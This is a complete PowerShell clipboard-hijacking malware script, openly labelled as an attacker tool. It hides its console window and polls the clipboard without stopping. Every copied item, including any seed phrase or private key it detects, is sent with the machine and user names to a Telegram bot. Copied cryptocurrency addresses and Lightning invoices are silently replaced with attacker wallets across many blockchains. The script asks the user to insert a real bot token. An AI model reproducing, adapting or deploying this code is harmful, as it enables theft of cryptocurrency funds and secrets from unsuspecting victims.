#Requires -Version 5.1

# Hide console window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
public const int SW_HIDE = 0;
public const int SW_SHOW = 5;
'

$hwnd = [Console.Window]::GetConsoleWindow()
if ($hwnd -ne [IntPtr]::Zero) { [Console.Window]::ShowWindow($hwnd, 0) | Out-Null }

# ═══════════════════════════════════════════════════════════════════════════════
#   CONFIGURATION - ATTACKER CONTROL SECTION (Telegram Edition)
# ═══════════════════════════════════════════════════════════════════════════════

$telegram_base = "https://api.telegram.org/bot0000000000:AAGRDjUqixqTmLDCKHD5_hbLCED6OzyEYpo/sendMessage?chat_id=5600000000&text="  # ← Replace with your real bot token and chat_id

$wallets = @{
    "BTC_LEGACY"   = @("1LuckyR1fFHEsXYzdJ3t4qGKBf2f4x5v6","1BoatSLRHtKNngkdXEeobR76b53LETtpyT")
    "BTC_SEGWIT"   = @("bc1qxy2kgdygjrsqtzq2n0yjar2v3v4x5y6z7w8u9v","bc1qm34lsc65zpw79lxes69zkq26np2re8dtmpnh5k")
    "ETH"          = @("0x742d35Cc6634C0532925a3b844Bc454e4438f44e","0x4bbeEB066eD09B7AEd07bF39EEe6b0aE9C0d9f45")
    "USDC"         = @(
        "0xYourPreferredUSDCWallet1Here1234567890abcdef",
        "0xAnotherStableWalletForUSDC4567890abcdef123",
        "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
        "0xYourThirdUSDCAddressHere7890abcdef12345678"
    )
    "BSC_BEP20"    = @("0x28c6c06298d514Db089934071355E5743bf21d60","0xF977814e90dA44bFA03b6295A0616a897441aceC")
    "POLYGON"      = @("0x0000000000000000000000000000000000001010","0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45")
    "BASE"         = @("0x1234567890abcdef1234567890abcdef12345678")
    "AVAX_CCHAIN"  = @("0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E")
    "TRON"         = @("Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","TQxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    "SOLANA"       = @("5EyD5u3t5t5t5t5t5t5t5t5t5t5t5t5t5t5t5t5","9gZ7gZ7gZ7gZ7gZ7gZ7gZ7gZ7gZ7gZ7gZ7gZ7")
    "CARDANO"      = @("addr1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    "XRP"          = @("rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh","rDsbeomae4FXwgQTJp9Rs64Qg9vDiTCdGN")
    "DOGE"         = @("Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    "LTC"          = @("Lxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx","Mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    "MONERO"       = @("4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    "TON"          = @("EQxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
}

$pattern_to_wallet_map = @{
    '^1[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{25,34}$'      = "BTC_LEGACY"
    '^bc1q[ac-hj-np-z02-9]{39,59}$'                                               = "BTC_SEGWIT"
    '^0x[a-fA-F0-9]{40}$'                                                         = "USDC"
    '^T[A-Za-z0-9]{33}$'                                                          = "TRON"
    '^[1-9A-HJ-NP-Za-km-z]{32,44}$'                                               = "SOLANA"
    '^addr1[0-9a-z]{58}$'                                                         = "CARDANO"
    '^r[1-9A-HJ-NP-Za-km-z]{25,35}$'                                              = "XRP"
    '^D{1}[1-9A-HJ-NP-Za-km-z]{33}$'                                              = "DOGE"
    '^[LM][1-9A-HJ-NP-Za-km-z]{33}$'                                              = "LTC"
    '^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$'                                          = "MONERO"
    '^[EU][QAC-HJ-NP-Za-km-z]{46}$'                                               = "TON"
}

# Lightning BOLT-11 patterns
$ln_patterns = @(
    '^lnbc[0-9]{1,}[a-z0-9]+1[pqyz0-9]{5,}$'
    '^lntb[0-9]{1,}[a-z0-9]+1[pqyz0-9]{5,}$'
    '^lnr[0-9]{1,}[a-z0-9]+1[pqyz0-9]{5,}$'
)

$lightning_replacements = @(
    "lnbc500u1p3xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    "lnbc10n1p4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
)

# ═══════════════════════════════════════════════════════════════════════════════
#   WHITELIST - Don't swap our own own addresses
# ═══════════════════════════════════════════════════════════════════════════════
$our_addresses = @()
foreach ($addrs in $wallets.Values) { $our_addresses += $addrs }
$our_addresses = $our_addresses | Sort-Object -Unique

# ═══════════════════════════════════════════════════════════════════════════════
#   LOGGING & STEALING (Telegram Edition - sends to your bot/channel)
# ═══════════════════════════════════════════════════════════════════════════════
$logPath = "$env:APPDATA\SysCache\clip.log"
$null = New-Item -ItemType Directory -Force -Path (Split-Path $logPath)

function Send-ToTelegram {
    param($data)
    try {
        $text = [System.Uri]::EscapeDataString("Timestamp: $($data.ts)`nComputer: $($data.comp)`nUser: $($data.user)`nClipboard: $($data.orig)`nIs URL: $($data.is_url)`nIs Seed: $($data.is_seed)`nIs Private Key: $($data.is_priv)")
        $full_uri = $telegram_base + $text
        Invoke-RestMethod -Uri $full_uri -Method Get -TimeoutSec 8 -UseBasicParsing | Out-Null
    } catch {}
}

# ═══════════════════════════════════════════════════════════════════════════════
#   MAIN LOOP
# ═══════════════════════════════════════════════════════════════════════════════
Add-Type -AssemblyName System.Windows.Forms

$lastClip = ""

while ($true) {
    try {
        $clip = [System.Windows.Forms.Clipboard]::GetText([System.Windows.Forms.TextDataFormat]::Text)
        if ([string]::IsNullOrWhiteSpace($clip) -or $clip -eq $lastClip) {
            Start-Sleep -Milliseconds (Get-Random -Minimum 350 -Maximum 720)
            continue
        }

        $clip = $clip.Trim()
        $lastClip = $clip

        # Always steal everything
        $payload = @{
            ts       = Get-Date -Format "o"
            comp     = $env:COMPUTERNAME
            user     = $env:USERNAME
            orig     = $clip
            is_url   = $clip -match '^https?://'
            is_seed  = $clip -match '(\b\w+\s+){11,23}\b' -and $clip.Length -lt 300
            is_priv  = $clip -match '^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$' -or 
                       $clip -match '^L[a-zA-Z0-9]{51}$'
        }

        Send-ToTelegram $payload

        # Skip replacement for dangerous content
        if ($payload.is_url -or $payload.is_seed -or $payload.is_priv) {
            Start-Sleep -Milliseconds (Get-Random -Minimum 400 -Maximum 850)
            continue
        }

        $replaced = $false

        # Lightning special handling
        foreach ($lnPat in $ln_patterns) {
            if ($clip -match $lnPat) {
                if ($lightning_replacements.Count -gt 0) {
                    $newInvoice = $lightning_replacements | Get-Random
                    [System.Windows.Forms.Clipboard]::SetText($newInvoice)
                    $replaced = $true
                    break
                }
            }
        }

        # Normal addresses
        if (-not $replaced) {
            foreach ($regex in $pattern_to_wallet_map.Keys) {
                if ($clip -imatch $regex) {
                    $network = $pattern_to_wallet_map[$regex]

                    # Whitelist check
                    if ($our_addresses -contains $clip) { break }

                    $candidates = $wallets[$network]
                    if ($candidates -and $candidates.Count -gt 0) {
                        $victim = $candidates | Get-Random
                        [System.Windows.Forms.Clipboard]::SetText($victim)
                        $replaced = $true
                        break
                    }
                }
            }
        }

        # Quiet local log only on replacement
        if ($replaced) {
            "$((Get-Date -Format "yyyy-MM-dd HH:mm:ss")) | Replaced" | Add-Content $logPath -Encoding utf8
        }
    }
    catch { }

    Start-Sleep -Milliseconds (Get-Random -Minimum 320 -Maximum 680)

}
